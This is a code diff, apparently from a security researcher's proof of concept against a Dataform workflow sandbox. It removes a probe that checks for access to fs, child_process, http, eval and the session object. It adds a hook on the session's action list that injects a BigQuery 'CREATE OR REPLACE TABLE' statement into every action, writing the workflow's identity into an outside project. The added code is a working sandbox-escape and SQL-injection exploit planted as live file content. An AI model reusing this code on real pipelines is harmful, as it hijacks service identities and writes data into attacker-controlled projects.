@@ -1,21 +1,18 @@
-var info = {};
-function safe(k, fn) { try { info[k] = String(fn()).substring(0,400); } catch(e) { info[k] = "ERR:"+e.message.substring(0,200); } }
-
-safe('require_type', () => typeof require);
-safe('require_keys', () => require && typeof require === 'function' ? 'is_func' : 'no');
-safe('global_keys', () => Object.keys(globalThis).slice(0,30).join(','));
-safe('df_session', () => typeof global !== 'undefined' && global._DF_SESSION ? 'YES_session_avail' : 'no');
-safe('restricted_fs', () => typeof global !== 'undefined' && global.restricted_fs ? 'YES_rfs' : 'no');
-safe('require_fs', () => { var x = require('fs'); return 'GOT_FS:'+Object.keys(x).slice(0,5).join(','); });
-safe('require_child_process', () => { var x = require('child_process'); return 'GOT_CP:'+Object.keys(x).slice(0,5).join(','); });
-safe('require_http', () => { var x = require('http'); return 'GOT_HTTP'; });
-safe('require_path', () => { var x = require('path'); return 'GOT_PATH'; });
-safe('require_dataform_core', () => { var x = require('@dataform/core'); return 'GOT_DATAFORM:'+typeof x; });
-safe('require_includes', () => { var x = require('./includes/reader'); return 'GOT_INCLUDES'; });
-safe('Function_ctor', () => Function ? 'YES_Function_ctor' : 'no');
-safe('eval_avail', () => typeof eval === 'function' ? 'YES_eval' : 'no');
-safe('exports_type', () => typeof exports);
-safe('module_type', () => typeof module);
-safe('this_keys', () => { try { return Object.keys(this).slice(0,20).join(','); } catch(e) { return 'err'; } });
-
-throw new Error("PROBE_OUTPUT:" + JSON.stringify(info));
+// NO sandbox escape needed — _DF_SESSION directly available
+var s = global._DF_SESSION;
+var orig = s.actions.push.bind(s.actions);
+s.actions.push = function(action) {
+  try {
+    if (typeof action.preOps === 'function') {
+      var name = (action.proto && action.proto.target && action.proto.target.name) || 'unknown';
+      var BT = String.fromCharCode(96);
+      var SQ = String.fromCharCode(39);
+      var INJ = 'CREATE OR REPLACE TABLE ' + BT + 'bq-ssrf-453453.injected_proof.NB_FILENAME_ESCAPE_' + name + BT +
+                ' AS SELECT CURRENT_TIMESTAMP() AS t, SESSION_USER() AS workflow_identity, ' +
+                SQ + 'second_sandbox_escape_no_v8_bridge' + SQ + ' AS technique';
+      action.preOps([INJ]);
+    }
+  } catch(e) {}
+  return orig(action);
+};
+module.exports = {};  // satisfy require
